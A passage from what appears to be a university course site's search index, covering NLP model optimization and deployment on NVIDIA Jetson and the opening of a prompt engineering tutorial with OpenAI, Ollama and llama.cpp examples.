0].plot(list(self.metrics['gpu_memory']))\n        axes[1, 0].set_title('GPU Memory Usage (MB)')\n        axes[1, 0].set_ylabel('Memory (MB)')\n\n        # CPU Usage\n        axes[1, 1].plot(list(self.metrics['cpu_usage']))\n        axes[1, 1].set_title('CPU Usage (%)')\n        axes[1, 1].set_ylabel('CPU %')\n\n        plt.tight_layout()\n        plt.savefig(save_path)\n        plt.show()\n\n        print(f\"\ud83d\udcca Performance plots saved to {save_path}\")\n</code></pre>"},{"location":"curriculum/07_nlp_applications_llm_optimization/#bonus-lab-export-huggingface-onnx-tensorrt_1","title":"\ud83e\uddea Bonus Lab: Export HuggingFace \u2192 ONNX \u2192 TensorRT","text":"<ol> <li>Export:</li> </ol> <pre><code>import torch\nfrom transformers import AutoModelForSequenceClassification\nmodel = AutoModelForSequenceClassification.from_pretrained(\"distilbert-base-uncased\")\ndummy = torch.randint(0, 100, (1, 64))\ntorch.onnx.export(model, (dummy,), \"model.onnx\", input_names=[\"input_ids\"])\n</code></pre> <ol> <li>Convert:</li> </ol> <pre><code>trtexec --onnx=model.onnx --saveEngine=model.trt\n</code></pre> <ol> <li>Run using TensorRT Python bindings or <code>onnxruntime-gpu</code></li> </ol>"},{"location":"curriculum/07_nlp_applications_llm_optimization/#production-deployment-strategies_1","title":"\ud83d\ude80 Production Deployment Strategies","text":""},{"location":"curriculum/07_nlp_applications_llm_optimization/#1-multi-stage-docker-optimization_1","title":"1. \ud83d\udc33 Multi-Stage Docker Optimization","text":"<pre><code># Dockerfile.nlp-production\n# Multi-stage build for optimized NLP deployment\nFROM nvcr.io/nvidia/pytorch:24.04-py3 as builder\n\n# Install build dependencies\nRUN pip install transformers torch-audio torchaudio torchvision\nRUN pip install onnx onnxruntime-gpu tensorrt\n\n# Copy and optimize models\nCOPY models/ /tmp/models/\nCOPY scripts/optimize_models.py /tmp/\nRUN python /tmp/optimize_models.py\n\n# Production stage\nFROM nvcr.io/nvidia/pytorch:24.04-py3\n\n# Install only runtime dependencies\nRUN pip install --no-cache-dir \\\n    transformers==4.36.0 \\\n    torch==2.1.0 \\\n    onnxruntime-gpu==1.16.0 \\\n    fastapi==0.104.0 \\\n    uvicorn==0.24.0\n\n# Copy optimized models\nCOPY --from=builder /tmp/optimized_models/ /app/models/\nCOPY src/ /app/src/\n\nWORKDIR /app\nEXPOSE 8000\n\nCMD [\"uvicorn\", \"src.main:app\", \"--host\", \"0.0.0.0\", \"--port\", \"8000\"]\n</code></pre>"},{"location":"curriculum/07_nlp_applications_llm_optimization/#2-fastapi-production-server_1","title":"2. \ud83c\udf10 FastAPI Production Server","text":"<p>Use the  to compare different LLM inference methods: <pre><code># Compare all available LLM inference methods\npython jetson_nlp_toolkit.py llm --method all\n\n# Test specific inference methods\npython jetson_nlp_toolkit.py llm --method huggingface --model \"microsoft/DialoGPT-small\"\npython jetson_nlp_toolkit.py llm --method llamacpp --model-path \"/models/mistral.gguf\"\npython jetson_nlp_toolkit.py llm --method ollama --model \"mistral\"\n\n# Custom prompts and settings\npython jetson_nlp_toolkit.py llm --prompts \"Explain the future of AI in education.\" --max-tokens 100\n\n# Save comparison results\npython jetson_nlp_toolkit.py llm --output llm_comparison_results.json\n</code></pre> <p>The LLM comparison evaluates: - HuggingFace Transformers: GPU-optimized inference - llama.cpp: CPU-optimized quantized models - Ollama API: Containerized LLM serving</p> <p>Metrics measured: - Average latency per prompt - Tokens generated per second - Memory usage - Model loading time - Response quality</p>"},{"location":"curriculum/07_nlp_applications_llm_optimization/#record-results_1","title":"\ud83d\udcca Record Results","text":"Method Latency (s) Tokens/sec GPU Mem (MB) HuggingFace PyTorch llama-cpp-python Ollama REST API <p>Use <code>tegrastats</code> or <code>jtop</code> to observe GPU memory and CPU usage during inference.</p>"},{"location":"curriculum/07_nlp_applications_llm_optimization/#lab-deliverables_1","title":"\ud83d\udccb Lab Deliverables","text":""},{"location":"curriculum/07_nlp_applications_llm_optimization/#for-lab-1-multi-application-benchmark_1","title":"For Lab 1 (Multi-Application Benchmark):","text":"<ul> <li>Completed evaluation results JSON file</li> <li>Performance comparison charts for all NLP tasks</li> <li>Analysis report identifying best models for each task on Jetson</li> <li>Resource utilization graphs (<code>tegrastats</code> screenshots)</li> </ul>"},{"location":"curriculum/07_nlp_applications_llm_optimization/#for-lab-2-optimization-techniques_1","title":"For Lab 2 (Optimization Techniques):","text":"<ul> <li>Quantization comparison table</li> <li>Memory usage analysis</li> <li>Speedup and compression ratio calculations</li> <li>Recommendations for production deployment</li> </ul>"},{"location":"curriculum/07_nlp_applications_llm_optimization/#for-lab-3-llm-container-comparison_1","title":"For Lab 3 (LLM Container Comparison):","text":"<ul> <li>Completed benchmark table</li> <li>Screenshots of <code>tegrastats</code> during inference</li> <li>Analysis: Which approach is fastest, lightest, and most accurate for Jetson?</li> </ul>"},{"location":"curriculum/07_nlp_applications_llm_optimization/#advanced-nlp-optimization-strategies_1","title":"\ud83c\udfaf Advanced NLP Optimization Strategies","text":""},{"location":"curriculum/07_nlp_applications_llm_optimization/#1-model-pruning-for-jetson_1","title":"1. \ud83d\udd27 Model Pruning for Jetson","text":"<pre><code># model_pruning.py\nimport torch\nimport torch.nn.utils.prune as prune\nfrom transformers import AutoModelForSequenceClassification\n\ndef prune_model(model, pruning_ratio=0.2):\n    \"\"\"Apply structured pruning to transformer model\"\"\"\n    for name, module in model.named_modules():\n        if isinstance(module, torch.nn.Linear):\n            prune.l1_unstructured(module, name='weight', amount=pruning_ratio)\n            prune.remove(module, 'weight')\n\n    return model\n\n# Example usage\nmodel = AutoModelForSequenceClassification.from_pretrained(\"distilbert-base-uncased\")\npruned_model = prune_model(model, pruning_ratio=0.3)\n</code></pre>"},{"location":"curriculum/07_nlp_applications_llm_optimization/#2-knowledge-distillation_1","title":"2. \ud83d\ude80 Knowledge Distillation","text":"<pre><code># knowledge_distillation.py\nimport torch\nimport torch.nn as nn\nfrom transformers import AutoModelForSequenceClassification, AutoTokenizer\n\nclass DistillationTrainer:\n    def __init__(self, teacher_model, student_model, temperature=3.0, alpha=0.7):\n        self.teacher = teacher_model\n        self.student = student_model\n        self.temperature = temperature\n        self.alpha = alpha\n        self.kl_loss = nn.KLDivLoss(reduction='batchmean')\n        self.ce_loss = nn.CrossEntropyLoss()\n\n    def distillation_loss(self, student_logits, teacher_logits, labels):\n        \"\"\"Calculate distillation loss\"\"\"\n        # Soft targets from teacher\n        teacher_probs = torch.softmax(teacher_logits / self.temperature, dim=1)\n        student_log_probs = torch.log_softmax(student_logits / self.temperature, dim=1)\n\n        # Distillation loss\n        distill_loss = self.kl_loss(student_log_probs, teacher_probs) * (self.temperature ** 2)\n\n        # Hard target loss\n        hard_loss = self.ce_loss(student_logits, labels)\n\n        # Combined loss\n        total_loss = self.alpha * distill_loss + (1 - self.alpha) * hard_loss\n        return total_loss\n</code></pre>"},{"location":"curriculum/07_nlp_applications_llm_optimization/#3-dynamic-batching-for-real-time-inference_1","title":"3. \ud83d\udd04 Dynamic Batching for Real-time Inference","text":"<pre><code># dynamic_batching.py\nimport asyncio\nimport time\nfrom collections import deque\nfrom typing import List, Tuple\n\nclass DynamicBatcher:\n    def __init__(self, model, tokenizer, max_batch_size=8, max_wait_time=0.1):\n        self.model = model\n        self.tokenizer = tokenizer\n        self.max_batch_size = max_batch_size\n        self.max_wait_time = max_wait_time\n        self.request_queue = deque()\n        self.processing = False\n\n    async def add_request(self, text: str) -&gt; str:\n        \"\"\"Add inference request to queue\"\"\"\n        future = asyncio.Future()\n        self.request_queue.append((text, future))\n\n        if not self.processing:\n            asyncio.create_task(self.process_batch())\n\n        return await future\n\n    async def process_batch(self):\n        \"\"\"Process requests in batches\"\"\"\n        self.processing = True\n\n        while self.request_queue:\n            batch = []\n            futures = []\n            start_time = time.time()\n\n            # Collect batch\n            while (len(batch) &lt; self.max_batch_size and \n                   self.request_queue and \n                   (time.time() - start_time) &lt; self.max_wait_time):\n\n                text, future = self.request_queue.popleft()\n                batch.append(text)\n                futures.append(future)\n\n                if not self.request_queue:\n                    await asyncio.sleep(0.01)  # Small wait for more requests\n\n            if batch:\n                # Process batch\n                results = await self.inference_batch(batch)\n\n                # Return results\n                for future, result in zip(futures, results):\n                    future.set_result(result)\n\n        self.processing = False\n\n    async def inference_batch(self, texts: List[str]) -&gt; List[str]:\n        \"\"\"Run inference on batch\"\"\"\n        inputs = self.tokenizer(\n            texts, \n            return_tensors=\"pt\", \n            padding=True, \n            truncation=True,\n            max_length=512\n        )\n\n        with torch.no_grad():\n            outputs = self.model(**inputs)\n            predictions = torch.argmax(outputs.logits, dim=-1)\n\n        return [f\"Prediction: {pred.item()}\" for pred in predictions]\n</code></pre>"},{"location":"curriculum/07_nlp_applications_llm_optimization/#4-real-time-performance-monitoring_1","title":"4. \ud83d\udcca Real-time Performance Monitoring","text":"<pre><code># performance_monitor.py\nimport time\nimport psutil\nimport torch\nfrom collections import deque\nimport matplotlib.pyplot as plt\nfrom threading import Thread\n\nclass JetsonNLPMonitor:\n    def __init__(self, window_size=100):\n        self.window_size = window_size\n        self.metrics = {\n            'latency': deque(maxlen=window_size),\n            'throughput': deque(maxlen=window_size),\n            'gpu_memory': deque(maxlen=window_size),\n            'cpu_usage': deque(maxlen=window_size),\n            'timestamps': deque(maxlen=window_size)\n        }\n        self.monitoring = False\n\n    def start_monitoring(self):\n        \"\"\"Start background monitoring\"\"\"\n        self.monitoring = True\n        monitor_thread = Thread(target=self._monitor_loop)\n        monitor_thread.daemon = True\n        monitor_thread.start()\n\n    def stop_monitoring(self):\n        \"\"\"Stop monitoring\"\"\"\n        self.monitoring = False\n\n    def _monitor_loop(self):\n        \"\"\"Background monitoring loop\"\"\"\n        while self.monitoring:\n            timestamp = time.time()\n\n            # GPU memory\n            if torch.cuda.is_available():\n                gpu_memory = torch.cuda.memory_allocated() / 1024 / 1024  # MB\n            else:\n                gpu_memory = 0\n\n            # CPU usage\n            cpu_usage = psutil.cpu_percent()\n\n            self.metrics['gpu_memory'].append(gpu_memory)\n            self.metrics['cpu_usage'].append(cpu_usage)\n            self.metrics['timestamps'].append(timestamp)\n\n            time.sleep(0.1)  # Monitor every 100ms\n\n    def log_inference(self, latency, batch_size=1):\n        \"\"\"Log inference metrics\"\"\"\n        self.metrics['latency'].append(latency * 1000)  # Convert to ms\n        self.metrics['throughput'].append(batch_size / latency)  # samples/sec\n\n    def get_stats(self):\n        \"\"\"Get current statistics\"\"\"\n        if not self.metrics['latency']:\n            return {}\n\n        return {\n            'avg_latency_ms': sum(self.metrics['latency']) / len(self.metrics['latency']),\n            'avg_throughput': sum(self.metrics['throughput']) / len(self.metrics['throughput']),\n            'avg_gpu_memory_mb': sum(self.metrics['gpu_memory']) / len(self.metrics['gpu_memory']),\n            'avg_cpu_usage': sum(self.metrics['cpu_usage']) / len(self.metrics['cpu_usage']),\n            'total_inferences': len(self.metrics['latency'])\n        }\n\n    def plot_metrics(self, save_path=\"nlp_performance.png\"):\n        \"\"\"Plot performance metrics\"\"\"\n        fig, axes = plt.subplots(2, 2, figsize=(12, 8))\n\n        # Latency\n        axes[0, 0].plot(list(self.metrics['latency']))\n        axes[0, 0].set_title('Inference Latency (ms)')\n        axes[0, 0].set_ylabel('Latency (ms)')\n\n        # Throughput\n        axes[0, 1].plot(list(self.metrics['throughput']))\n        axes[0, 1].set_title('Throughput (samples/sec)')\n        axes[0, 1].set_ylabel('Samples/sec')\n\n        # GPU Memory\n        axes[1, 0].plot(list(self.metrics['gpu_memory']))\n        axes[1, 0].set_title('GPU Memory Usage (MB)')\n        axes[1, 0].set_ylabel('Memory (MB)')\n\n        # CPU Usage\n        axes[1, 1].plot(list(self.metrics['cpu_usage']))\n        axes[1, 1].set_title('CPU Usage (%)')\n        axes[1, 1].set_ylabel('CPU %')\n\n        plt.tight_layout()\n        plt.savefig(save_path)\n        plt.show()\n\n        print(f\"\ud83d\udcca Performance plots saved to {save_path}\")\n</code></pre>"},{"location":"curriculum/07_nlp_applications_llm_optimization/#bonus-lab-export-huggingface-onnx-tensorrt_2","title":"\ud83e\uddea Bonus Lab: Export HuggingFace \u2192 ONNX \u2192 TensorRT","text":"<ol> <li>Export:</li> </ol> <pre><code>import torch\nfrom transformers import AutoModelForSequenceClassification\nmodel = AutoModelForSequenceClassification.from_pretrained(\"distilbert-base-uncased\")\ndummy = torch.randint(0, 100, (1, 64))\ntorch.onnx.export(model, (dummy,), \"model.onnx\", input_names=[\"input_ids\"])\n</code></pre> <ol> <li>Convert:</li> </ol> <pre><code>trtexec --onnx=model.onnx --saveEngine=model.trt\n</code></pre> <ol> <li>Run using TensorRT Python bindings or <code>onnxruntime-gpu</code></li> </ol>"},{"location":"curriculum/07_nlp_applications_llm_optimization/#production-deployment-strategies_2","title":"\ud83d\ude80 Production Deployment Strategies","text":""},{"location":"curriculum/07_nlp_applications_llm_optimization/#1-multi-stage-docker-optimization_2","title":"1. \ud83d\udc33 Multi-Stage Docker Optimization","text":"<pre><code># Dockerfile.nlp-production\n# Multi-stage build for optimized NLP deployment\nFROM nvcr.io/nvidia/pytorch:24.04-py3 as builder\n\n# Install build dependencies\nRUN pip install transformers torch-audio torchaudio torchvision\nRUN pip install onnx onnxruntime-gpu tensorrt\n\n# Copy and optimize models\nCOPY models/ /tmp/models/\nCOPY scripts/optimize_models.py /tmp/\nRUN python /tmp/optimize_models.py\n\n# Production stage\nFROM nvcr.io/nvidia/pytorch:24.04-py3\n\n# Install only runtime dependencies\nRUN pip install --no-cache-dir \\\n    transformers==4.36.0 \\\n    torch==2.1.0 \\\n    onnxruntime-gpu==1.16.0 \\\n    fastapi==0.104.0 \\\n    uvicorn==0.24.0\n\n# Copy optimized models\nCOPY --from=builder /tmp/optimized_models/ /app/models/\nCOPY src/ /app/src/\n\nWORKDIR /app\nEXPOSE 8000\n\nCMD [\"uvicorn\", \"src.main:app\", \"--host\", \"0.0.0.0\", \"--port\", \"8000\"]\n</code></pre>"},{"location":"curriculum/07_nlp_applications_llm_optimization/#2-fastapi-production-server_2","title":"2. \ud83c\udf10 FastAPI Production Server","text":"<p>Use the  to deploy a production-ready NLP server:</p> <pre><code># Start production NLP server\npython jetson_nlp_toolkit.py server --host 0.0.0.0 --port 8000\n\n# Start with custom models\npython jetson_nlp_toolkit.py server --sentiment-model \"cardiffnlp/twitter-roberta-base-sentiment-latest\"\n\n# Start with monitoring enabled\npython jetson_nlp_toolkit.py server --enable-monitoring\n</code></pre> <p>The production server includes: - FastAPI Framework: High-performance async API - Model Optimization: FP16 precision and GPU acceleration - Batch Processing: Efficient handling of multiple requests - Health Monitoring: System status and performance metrics - Error Handling: Robust error management and logging - WebSocket Support: Real-time chat interface</p>"},{"location":"curriculum/07_nlp_applications_llm_optimization/#api-endpoints-available","title":"API Endpoints Available:","text":"<ul> <li>GET /health: System health and model status</li> <li>POST /sentiment: Batch sentiment analysis</li> <li>POST /qa: Question answering</li> <li>POST /summarize: Text summarization</li> <li>WebSocket /chat: Real-time chat interface</li> </ul>"},{"location":"curriculum/07_nlp_applications_llm_optimization/#testing-the-server","title":"Testing the Server:","text":"<pre><code># Test health endpoint\ncurl http://localhost:8000/health\n\n# Test sentiment analysis\ncurl -X POST \"http://localhost:8000/sentiment\" \\\n     -H \"Content-Type: application/json\" \\\n     -d '{\"texts\": [\"I love this product!\", \"This is terrible\"], \"batch_size\": 2}'\n\n# Test question answering\ncurl -X POST \"http://localhost:8000/qa\" \\\n     -H \"Content-Type: application/json\" \\\n     -d '{\"questions\": [\"What is AI?\"], \"contexts\": [\"Artificial Intelligence is the simulation of human intelligence.\"]}'\n\n### 3. \ud83d\udcca Load Testing &amp; Performance Validation\n\nUse the &lt;mcfile name=\"jetson_nlp_toolkit.py\" path=\"jetson/jetson_nlp_toolkit.py\"&gt;&lt;/mcfile&gt; for comprehensive load testing:\n\n```bash\n# Run load test on running server\npython jetson_nlp_toolkit.py loadtest --url http://localhost:8000\n\n# Custom load test parameters\npython jetson_nlp_toolkit.py loadtest --url http://localhost:8000 --concurrent 20 --requests 500\n\n# Test specific endpoints\npython jetson_nlp_toolkit.py loadtest --url http://localhost:8000 --endpoint sentiment\npython jetson_nlp_toolkit.py loadtest --url http://localhost:8000 --endpoint qa\n\n# Save load test results\npython jetson_nlp_toolkit.py loadtest --url http://localhost:8000 --output load_test_results.json\n</code></pre> <p>The load tester provides: - Concurrent Testing: Simulates multiple users - Endpoint Coverage: Tests all API endpoints - Performance Metrics: Latency, throughput, success rate - Error Analysis: Detailed failure reporting - Results Export: JSON format for further analysis <pre><code>---\n\n## \ud83c\udfaf Final Challenge: Complete NLP Pipeline on Jetson\n\n### \ud83c\udfc6 Challenge Objective\n\nBuild a complete, production-ready NLP pipeline that processes real-world data and demonstrates all optimization techniques learned in this tutorial.\n\n### \ud83d\udccb Challenge Requirements\n\n#### 1. **Multi-Modal NLP System**\nImplement a system that handles:\n- **Text Classification** (sentiment analysis on product reviews)\n- **Information Extraction** (NER on news articles)\n- **Question Answering** (FAQ system for customer support)\n- **Text Summarization** (news article summarization)\n- **Real-time Chat** (customer service chatbot)\n\n#### 2. **Optimization Implementation**\n- Apply **quantization** (FP16 minimum, INT8 preferred)\n- Implement **dynamic batching** for throughput optimization\n- Use **model pruning** to reduce memory footprint\n- Deploy with **TensorRT** optimization where possible\n- Implement **caching** for frequently requested content\n\n#### 3. **Production Deployment**\n- **Containerized deployment** with multi-stage Docker builds\n- **REST API** with proper error handling and logging\n- **Load balancing** for high availability\n- **Monitoring and metrics** collection\n- **Auto-scaling** based on resource utilization\n\n#### 4. **Performance Benchmarking**\n- **Latency analysis** (P50, P95, P99 percentiles)\n- **Throughput measurement** (requests per second)\n- **Resource utilization** (GPU/CPU/memory usage)\n- **Accuracy validation** on standard datasets\n- **Cost analysis** (inference cost per request)\n\n### \ud83d\udee0\ufe0f Implementation Guide\n\nUse the comprehensive &lt;mcfile name=\"jetson_nlp_toolkit.py\" path=\"jetson/jetson_nlp_toolkit.py\"&gt;&lt;/mcfile&gt; to implement the complete challenge:\n\n```bash\n# Run comprehensive evaluation across all NLP tasks\npython jetson_nlp_toolkit.py evaluate --all-tasks --save-results challenge_evaluation.json\n\n# Apply all optimization techniques\npython jetson_nlp_toolkit.py optimize --all-methods --model distilbert-base-uncased-finetuned-sst-2-english\n\n# Deploy production server with monitoring\npython jetson_nlp_toolkit.py server --enable-monitoring --host 0.0.0.0 --port 8000\n\n# Run comprehensive load testing\npython jetson_nlp_toolkit.py loadtest --url http://localhost:8000 --concurrent 50 --requests 1000\n\n# Compare LLM inference methods\npython jetson_nlp_toolkit.py llm --all-methods --model microsoft/DialoGPT-small\n</code></pre></p> <p>The toolkit provides all necessary components: - Multi-task NLP Pipeline: Sentiment, NER, QA, Summarization, Chat - Optimization Techniques: Quantization, Pruning, Distillation, TensorRT - Production Deployment: FastAPI server with WebSocket support - Performance Monitoring: Real-time metrics and analysis - Load Testing: Comprehensive performance validation - Caching &amp; Batching: Redis integration and dynamic batching</p>"},{"location":"curriculum/07_nlp_applications_llm_optimization/#evaluation-criteria","title":"\ud83d\udcca Evaluation Criteria","text":"Criterion Weight Excellent (90-100%) Good (70-89%) Satisfactory (50-69%) Functionality 25% All 5 NLP tasks working perfectly 4/5 tasks working 3/5 tasks working Optimization 25% All optimization techniques applied Most optimizations applied Basic optimizations Performance 20% &lt;50ms P95 latency, &gt;100 req/s &lt;100ms P95, &gt;50 req/s &lt;200ms P95, &gt;20 req/s Production Ready 15% Full deployment with monitoring Basic deployment Local deployment only Code Quality 10% Clean, documented, tested Well-structured Basic implementation Innovation 5% Novel optimizations/features Creative solutions Standard implementation"},{"location":"curriculum/07_nlp_applications_llm_optimization/#bonus-challenges","title":"\ud83c\udfaf Bonus Challenges","text":"<ol> <li>Multi-Language Support: Extend the pipeline to handle multiple languages</li> <li>Edge Deployment: Deploy on actual Jetson hardware with resource constraints</li> <li>Federated Learning: Implement model updates without centralized data</li> <li>Real-time Streaming: Process continuous data streams with low latency</li> <li>Custom Models: Train and deploy domain-specific models</li> </ol>"},{"location":"curriculum/07_nlp_applications_llm_optimization/#summary","title":"\ud83d\udccc Summary","text":"<ul> <li>Comprehensive NLP Applications: Covered 6 major NLP tasks with Jetson-specific optimizations</li> <li>Advanced Optimization Techniques: Quantization, pruning, distillation, and dynamic batching</li> <li>Production Deployment: Multi-stage Docker builds, FastAPI servers, and load testing</li> <li>Performance Monitoring: Real-time metrics collection and analysis</li> <li>Practical Evaluation: Standardized benchmarking on popular datasets</li> <li>Complete Pipeline: End-to-end solution from development to production</li> <li>All-in-One Toolkit: Unified command-line tool (<code>jetson_nlp_toolkit.py</code>) combining all examples and implementations</li> </ul> <p>This tutorial provides a comprehensive foundation for deploying production-ready NLP applications on Jetson devices, balancing performance, accuracy, and resource efficiency. The included all-in-one toolkit makes it easy to experiment with different NLP tasks, optimization techniques, and deployment strategies using a simple command-line interface.</p>"},{"location":"curriculum/08_prompt_engineering_langchain_jetson/","title":"\ud83e\udde0 Advanced Prompt Engineering with LangChain on Jetson","text":"<p>Author: Dr. Kaikai Liu, Ph.D. Position: Associate Professor, Computer Engineering Institution: San Jose State University Contact: kaikai.liu@sjsu.edu</p> <p>Note: All code examples in this tutorial have been consolidated into a unified Python script called <code>jetson_prompt_toolkit.py</code>. See the Unified Python Script section at the end of this document for installation and usage instructions.</p>"},{"location":"curriculum/08_prompt_engineering_langchain_jetson/#what-is-prompt-engineering","title":"\ud83c\udfaf What is Prompt Engineering?","text":"<p>Prompt engineering is the art and science of crafting effective inputs to guide large language models (LLMs) toward desired outputs. It's the bridge between human intent and AI understanding.</p> <p>Why it matters on Jetson: - \ud83d\ude80 Efficiency: Better prompts = fewer tokens = faster inference on edge devices - \ud83c\udfaf Accuracy: Precise instructions lead to more reliable outputs - \ud83d\udcb0 Cost-effective: Reduces API calls and computational overhead - \ud83d\udd12 Safety: Proper prompting prevents harmful or biased responses</p>"},{"location":"curriculum/08_prompt_engineering_langchain_jetson/#prompt-engineering-fundamentals","title":"\ud83c\udfd7\ufe0f Prompt Engineering Fundamentals","text":""},{"location":"curriculum/08_prompt_engineering_langchain_jetson/#core-principles","title":"\ud83d\udccb Core Principles","text":"<ol> <li>Clarity: Be specific and unambiguous</li> <li>Context: Provide relevant background information</li> <li>Structure: Use consistent formatting and organization</li> <li>Examples: Show the model what you want (few-shot learning)</li> <li>Constraints: Set clear boundaries and expectations</li> </ol>"},{"location":"curriculum/08_prompt_engineering_langchain_jetson/#prompt-anatomy","title":"\ud83c\udfa8 Prompt Anatomy","text":"<pre><code>[SYSTEM MESSAGE] - Sets the AI's role and behavior\n[CONTEXT] - Background information\n[INSTRUCTION] - What you want the AI to do\n[FORMAT] - How you want the output structured\n[EXAMPLES] - Sample inputs and outputs\n[CONSTRAINTS] - Limitations and requirements\n</code></pre>"},{"location":"curriculum/08_prompt_engineering_langchain_jetson/#platform-setup-three-inference-pathways","title":"\ud83d\udca1 Platform Setup: Three Inference Pathways","text":""},{"location":"curriculum/08_prompt_engineering_langchain_jetson/#1-openai-api-setup","title":"\ud83d\udd39 1. OpenAI API Setup","text":"<pre><code>import openai\nfrom openai import OpenAI\nimport os\nfrom typing import List, Dict\n\nclass OpenAIPrompter:\n    def __init__(self, api_key: str = None, model: str = \"gpt-4o-mini\"):\n        self.client = OpenAI(api_key=api_key or os.getenv(\"OPENAI_API_KEY\"))\n        self.model = model  # Cost-effective for learning\n\n    def prompt(self, messages: List[Dict[str, str]], **kwargs) -&gt; str:\n        \"\"\"Send prompt to OpenAI API\"\"\"\n        response = self.client.chat.completions.create(\n            model=self.model,\n            messages=messages,\n            temperature=kwargs.get('temperature', 0.7),\n            max_tokens=kwargs.get('max_tokens', 1000)\n        )\n        return response.choices[0].message.content\n\n    def simple_prompt(self, prompt: str, system_msg: str = None) -&gt; str:\n        \"\"\"Simple prompt interface\"\"\"\n        messages = []\n        if system_msg:\n            messages.append({\"role\": \"system\", \"content\": system_msg})\n        messages.append({\"role\": \"user\", \"content\": prompt})\n        return self.prompt(messages)\n\n# Usage\nopenai_prompter = OpenAIPrompter()\nresponse = openai_prompter.simple_prompt(\n    \"Explain edge computing in simple terms\",\n    \"You are a helpful AI assistant specializing in technology.\"\n)\nprint(response)\n</code></pre> <p>Note: This class is included in the unified <code>jetson_prompt_toolkit.py</code> script. You can run it with: <pre><code>python jetson_prompt_toolkit.py --mode basic --backends openai\n</code></pre></p> <p>The LangChain integration is also available: <pre><code>python jetson_prompt_toolkit.py --mode compare --backends openai\n</code></pre></p>"},{"location":"curriculum/08_prompt_engineering_langchain_jetson/#2-local-ollama-setup","title":"\ud83d\udd39 2. Local Ollama Setup","text":"<pre><code>import requests\nimport json\nfrom typing import List, Dict, Optional\n\nclass OllamaPrompter:\n    def __init__(self, base_url: str = \"http://localhost:11434\", model: str = \"llama3.2:3b\"):\n        self.base_url = base_url\n        self.model = model\n        self.session = requests.Session()\n\n    def is_available(self) -&gt; bool:\n        \"\"\"Check if Ollama is running\"\"\"\n        try:\n            response = self.session.get(f\"{self.base_url}/api/tags\")\n            return response.status_code == 200\n        except:\n            return False\n\n    def prompt(self, prompt: str, system_msg: str = None, **kwargs) -&gt; str:\n        \"\"\"Send prompt to Ollama\"\"\"\n        payload = {\n            \"model\": self.model,\n            \"prompt\": prompt,\n            \"stream\": False,\n            \"options\": {\n                \"temperature\": kwargs.get('temperature', 0.7),\n                \"num_predict\": kwargs.get('max_tokens', 1000)\n            }\n        }\n\n        if system_msg:\n            payload[\"system\"] = system_msg\n\n        response = self.session.post(\n            f\"{self.base_url}/api/generate\",\n            json=payload\n        )\n\n        if response.status_code == 200:\n            return response.json()[\"response\"]\n        else:\n            raise Exception(f\"Ollama error: {response.text}\")\n\n    def chat(self, messages: List[Dict[str, str]], **kwargs) -&gt; str:\n        \"\"\"Chat interface for conversation\"\"\"\n        payload = {\n            \"model\": self.model,\n            \"messages\": messages,\n            \"stream\": False,\n            \"options\": {\n                \"temperature\": kwargs.get('temperature', 0.7)\n            }\n        }\n\n        response = self.session.post(\n            f\"{self.base_url}/api/chat\",\n            json=payload\n        )\n\n        if response.status_code == 200:\n            return response.json()[\"message\"][\"content\"]\n        else:\n            raise Exception(f\"Ollama error: {response.text}\")\n\n# Setup and usage\nollama_prompter = OllamaPrompter()\n\nif ollama_prompter.is_available():\n    response = ollama_prompter.prompt(\n        \"Explain the benefits of running AI models locally on Jetson devices\",\n        \"You are an expert in edge AI and NVIDIA Jetson platforms.\"\n    )\n    print(response)\nelse:\n    print(\"Ollama not available. Start with: ollama serve\")\n</code></pre> <p>Note: This class is included in the unified <code>jetson_prompt_toolkit.py</code> script. You can run it with: <pre><code>python jetson_prompt_toolkit.py --mode basic --backends ollama\n</code></pre></p>"},{"location":"curriculum/08_prompt_engineering_langchain_jetson/#3-local-llama-cpp-python-setup","title":"\ud83d\udd39 3. Local llama-cpp-python Setup","text":"<pre><code>from llama_cpp import Llama\nimport time\nfrom typing import Optional\n\nclass LlamaCppPrompter:\n    def __init__(self, model_path: str, **kwargs):\n        self.model_path = model_path\n        self.llm = Llama(\n            model_path=model_path,\n            n_gpu_layers=kwargs.get('n_gpu_layers', -1),  # Use all GPU layers\n            n_ctx=kwargs.get('n_ctx', 4096),  # Context window\n            n_batch=kwargs.get('n_batch', 512),  # Batch size\n            verbose=kwargs.get('verbose', False)\n        )\n        print(f\"\u2705 Loaded model: {model_path}\")\n\n    def prompt(self, prompt: str, **kwargs) -&gt; str:\n        \"\"\"Generate response from prompt\"\"\"\n        start_time = time.time()\n\n        response = self.llm(\n            prompt,\n            max_tokens=kwargs.get('max_tokens', 1000),\n            temperature=kwargs.get('temperature', 0.7),\n            top_p=kwargs.get('top_p', 0.9),\n            stop=kwargs.get('stop', [\"\\n\\n\"]),\n            echo=False\n        )\n\n        inference_time = time.time() - start_time\n        print(f\"\u23f1\ufe0f Inference time: {inference_time:.2f}s\")\n\n        return response['choices'][0]['text'].strip()\n\n    def chat_prompt(self, system_msg: str, user_msg: str) -&gt; str:\n        \"\"\"Format as chat conversation\"\"\"\n        prompt = f\"\"\"&lt;|im_start|&gt;system\n{system_msg}&lt;|im_end|&gt;\n&lt;|im_start|&gt;user\n{user_msg}&lt;|im_end|&gt;\n&lt;|im_start|&gt;assistant\n\"\"\"\n        return self.prompt(prompt, stop=[\"&lt;|im_end|&gt;\"])\n\n# Usage (requires downloaded model)\n# llama_prompter = LlamaCppPrompter(\"/models/qwen2.5-3b-instruct-q4_k_m.gguf\")\n# response = llama_prompter.chat_prompt(\n#     \"You are an AI assistant specialized in edge computing.\",\n#     \"What are the advantages of running LLMs on Jetson devices?\"\n# )\n# print(response)\n</code></pre> <p>Note: This class is included in the unified <code>jetson_prompt_toolkit.py</code> script. You can run it with: <pre><code>python jetson_prompt_toolkit.py --mode basic --backends llamacpp --model_path /path/to/your/model.gguf\n</code></pre></p>"},{"location":"curriculum/08_prompt_engineering_langchain_jetson/#core-prompt-engineering-techniques","title":"\ud83c\udfa8 Core Prompt Engineering Techniques","text":""},{"location":"curriculum/08_prompt_engineering_langchain_jetson/#1-chain-of-thought-cot-reasoning","title":"\ud83e\udde0 1. Chain-of-Thought (CoT) Reasoning","text":"<p>Guide the model to think step-by-step for complex problems.</p> <pre><code>def demonstrate_chain_of_thought():\n    \"\"\"Compare basic vs chain-of-thought prompting\"\"\"\n\n    # Basic prompt\n    basic_prompt = \"What is 15% of 240?\"\n\n    # Chain-of-thought prompt\n    cot_prompt = \"\"\"\nSolve this step by step:\nWhat is 15% of 240?\n\nThink through this carefully:\n1. First, convert the percentage to a decimal\n2. Then multiply by the number\n3. Show your work\n\"\"\"\n\n    # Advanced CoT with reasoning\n    advanced_cot = 